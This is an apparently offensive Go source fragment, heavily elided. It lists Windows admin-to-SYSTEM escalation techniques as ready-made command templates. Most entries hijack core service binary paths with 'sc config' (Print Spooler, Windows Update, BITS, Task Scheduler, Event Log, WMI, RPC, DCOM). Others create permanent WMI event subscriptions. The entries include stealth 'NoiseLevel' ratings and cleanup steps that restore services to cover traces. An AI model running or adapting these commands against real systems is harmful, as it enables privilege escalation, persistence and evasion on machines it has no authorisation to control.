...
func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
	return []LOLBinMethod{
		...
		},
		{
			...
			Description:    "Creates named pipe and impersonates SYSTEM token",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc create "PipeService" binPath= "%s" type= own start= demand error= normal`,
				`sc start "PipeService"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`sc stop "PipeService"`,
				`sc delete "PipeService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			...
			Description:    "Abuses service failure recovery to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Spooler" binPath= "%s" type= own start= demand`,
		...
		},
		{
			...
			Description:    "Creates WMI event subscription to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'"`,
				`wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="UpdateConsumer", ExecutablePath="%s", CommandLineTemplate="%s"`,
		...
		{
			Name:           "Print Spooler Service Hijack",
			Description:    "Hijacks Print Spooler service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Spooler" binPath= "%s"`,
				`sc start "Spooler"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "Spooler" binPath= "%%systemroot%%\System32\spoolsv.exe"`,
			},
		...
		{
			Name:           "Windows Update Service Hijack",
			Description:    "Hijacks Windows Update service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "wuauserv" binPath= "%s"`,
				`sc start "wuauserv"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "wuauserv" binPath= "%%systemroot%%\system32\svchost.exe -k netsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Background Intelligent Transfer Service Hijack",
			Description:    "Hijacks BITS service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "bits" binPath= "%s"`,
				`sc start "bits"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
		...
		{
			Name:           "Task Scheduler Service Hijack",
			Description:    "Hijacks Task Scheduler service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Schedule" binPath= "%s"`,
				`sc start "Schedule"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
		...
		},
		{
			...
			Description:    "Hijacks NLA service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
		...
		},
		{
			...
			Description:    "Hijacks Windows Time service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
		...
		},
		{
			...
			Description:    "Creates permanent WMI event subscription for SYSTEM execution",
			EscalationType: "Admin->System",
			Commands: []string{
				`wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="SystemFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"`,
				`wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="SystemConsumer", ExecutablePath="%s", CommandLineTemplate="%s"`,
				`wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SystemFilter\"", Consumer="CommandLineEventConsumer.Name=\"SystemConsumer\""`,
				`cmd.exe /c "ping 127.0.0.1 -n 5 >nul"`,
				`wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding DELETE`,
				`wmic /namespace:\\root\subscription PATH CommandLineEventConsumer DELETE`,
				`wmic /namespace:\\root\subscription PATH __EventFilter DELETE`,
			},
		...
		{
			Name:           "Windows Event Log Service Hijack",
			Description:    "Hijacks Windows Event Log service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "eventlog" binPath= "%s"`,
				`sc start "eventlog"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "eventlog" binPath= "%%systemroot%%\System32\svchost.exe -k LocalServiceNetworkRestricted"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			...
			Description:    "Hijacks Remote Registry service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
		...
		{
			Name:           "Windows Management Instrumentation Service Hijack",
			Description:    "Hijacks WMI service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Winmgmt" binPath= "%s"`,
				`sc start "Winmgmt"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "Winmgmt" binPath= "%%systemroot%%\system32\svchost.exe -k netsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		...
		},
		{
			...
			Description:    "Hijacks Windows Update Orchestrator service",
			EscalationType: "Admin->System",
			Commands: []string{
		...
		},
		{
			...
			Description:    "Hijacks Cryptographic Services binary path",
			EscalationType: "Admin->System",
			Commands: []string{
		...
		{
			Name:           "Plug and Play Service Hijack",
			Description:    "Hijacks Plug and Play service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "PlugPlay" binPath= "%s"`,
				`sc start "PlugPlay"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "PlugPlay" binPath= "%%systemroot%%\system32\services.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "RPC Endpoint Mapper Service Hijack",
			Description:    "Hijacks RPC Endpoint Mapper service",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "RpcEptMapper" binPath= "%s"`,
				`sc start "RpcEptMapper"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "RpcEptMapper" binPath= "%%systemroot%%\system32\svchost.exe -k RPCSS"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "DCOM Server Process Launcher Hijack",
			Description:    "Hijacks DCOM Server Process Launcher service",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "DcomLaunch" binPath= "%s"`,
				`sc start "DcomLaunch"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "DcomLaunch" binPath= "%%systemroot%%\system32\svchost.exe -k DcomLaunch"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		...
		},
		{
			...
			Description:    "Hijacks DNS Client service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
